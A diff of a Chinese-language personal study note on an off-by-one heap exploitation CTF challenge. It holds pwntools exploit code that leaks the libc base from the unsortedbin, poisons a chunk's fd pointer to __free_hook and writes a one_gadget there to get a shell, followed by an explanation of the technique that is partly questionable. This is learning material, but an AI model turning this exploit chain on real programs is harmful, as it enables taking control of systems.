@@ -21,7 +21,11 @@ steinput的内部函数，存在off  by one,这个漏洞我看的时候也没看
 
 然后就拿到了权限。然后我现在的迷糊的地方就是泄露基址的地方。
 
+#### 问题一：
 我以前泄露基址的方法就是用free到unsortedbin中然后再释放读取main_arena+x的地址，然后我就会再将main_arena+x的地址减去x然后再减去0x10，这样就到了malloc_hook的地址了，但是这此我竟然发现泄露的地址竟然不是000结尾的。泄露的一直是错的。然后我不明白这个exp的方法为什么是要直接接受并且减去0x3EBD20？？我不明白！！！！
+
+==我今天测试发现-240就到了__malloc_hook了，我是先打印然后对比还差多少，然后相减。==
+![[Pasted image 20250425123709.png]]
 
 
 
@@ -146,19 +150,21 @@ file.recvuntil("Content: ")
   
   
 
-libc_offset = u64(file.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+# libc_offset = u64(file.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
 
-print(hex(libc_offset))
+# print(hex(libc_offset))
 
-libc_base = libc_offset - 0x3EBD20
+# libc_base = libc_offset - 0x3EBD20
 
-malloc_hook = libc_base + libc.sym['__malloc_hook']
+# malloc_hook = libc_base + libc.sym['__malloc_hook']
 
   
 
-# libc_offset = u64(file.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) -0x80
+libc_offset0 = u64(file.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
 
-# libc_base = libc_offset - libc.sym['__realloc_hook']
+libc_libc=libc_offset0-240
+
+libc_base = libc_libc - libc.sym['__malloc_hook']
 
   
 
@@ -179,15 +185,9 @@ one_gadget = libc_base + one[2]
 
 add(9, 0x38)
 
-  
-
 add(10, 0x38)
 
-  
-
 add(11, 0x38)
-
-  
 
 add(12, 0x38)
 
@@ -205,23 +205,13 @@ free(11)
 
 add(11, 0x68)
 
-  
-
 edit(11, b'c'*0x38 + p64(41) + p64(free_hook))
-
-  
 
 add(12, 0x38)
 
-  
-
 add(13, 0x38)
 
-  
-
 edit(13, p64(one_gadget))
-
-gdb.attach(file)
 
   
 
@@ -230,8 +220,6 @@ show(13)
 print(hex(one_gadget))
 
 # edit(12, b'/bin/sh\x00\x00')
-
-  
 
 free(1)
 
@@ -248,13 +236,13 @@ file.interactive()
 
 在堆溢出攻击中，使用“off-by-one”技术来修改下一个堆块的 `fd` 指针，使其指向 `free_hook`，是一种常见的方法。这种方法利用了堆管理器（如 glibc 的 `malloc` 和 `free`）的内部机制，通过覆盖下一个堆块的元数据来实现控制流劫持。
 
-### 为什么使用“off-by-one”技术？
+#### 为什么使用“off-by-one”技术？
 
 1. **堆块结构**：在 glibc 的堆管理中，每个堆块（chunk）都有一个头部，包含大小和标志位等信息。如果堆块是已分配的，那么在堆块数据之后紧跟着下一个堆块的头部。如果堆块是已释放的，那么堆块数据区域会被用来存储 `fd` 和 `bk` 指针，用于链接到其他已释放的堆块。
 
 2. **`off-by-one` 漏洞**：当存在一个 `off-by-one` 漏洞时，攻击者可以覆盖下一个堆块头部的第一个字节。如果下一个堆块是已释放的，那么这个覆盖会修改 `fd` 指针的最低有效字节。通过精心构造，可以使得 `fd` 指针指向一个特定的地址，如 `free_hook`。
 
-### 直接修改为 `free_hook` 的问题
+#### 直接修改为 `free_hook` 的问题
 
 直接修改下一个堆块的 `fd` 指针为 `free_hook` 的地址，而不使用 `off-by-one` 技术，可能会遇到以下问题：
 
@@ -264,9 +252,13 @@ file.interactive()
 
 3. **`off-by-one` 的优势**：`off-by-one` 漏洞允许攻击者逐步、可控地修改堆块的元数据，而不会立即引起堆管理器的注意。通过逐步修改 `fd` 指针的最低有效字节，攻击者可以更精确地控制堆块的链接关系，从而实现更复杂的攻击。
 
-### 总结
+#### 总结
 
 在“疯狂复制”题目中，使用 `off-by-one` 技术来修改下一个堆块的 `fd` 指针，使其指向 `free_hook`，是一种有效的方法。直接修改为 `free_hook` 的地址可能会遇到堆管理器的检查和堆块状态的问题，因此不建议直接修改。`off-by-one` 技术提供了更精细的控制，使得攻击更容易成功。
 
 如下：
 ![[d5c9a906dcc374ee8dbf3dcad9e64e73.jpg]]
+
+#### 新的解题想法：
+
+我在想我先用unsortedbin泄露一个__malloc_hook或者__free_hook的地址，不是真实地址，就只是在堆中的地址，泄露后我再利用off by one去泄露其真实地址，然后再接收，接收后我们再进行减去libc中的偏移，就得出了libc的基址，同时我们在off by one 的下一个堆块中的fd指针改成了我们需要的free_hook或malloc_hook的真实地址，我们还需要进行的是我们需要将one_gadget写入free_hook或malloc_hook的真实地址，这样我们在进行malloc或free的时候就可以拿到权限了。这还没试试。
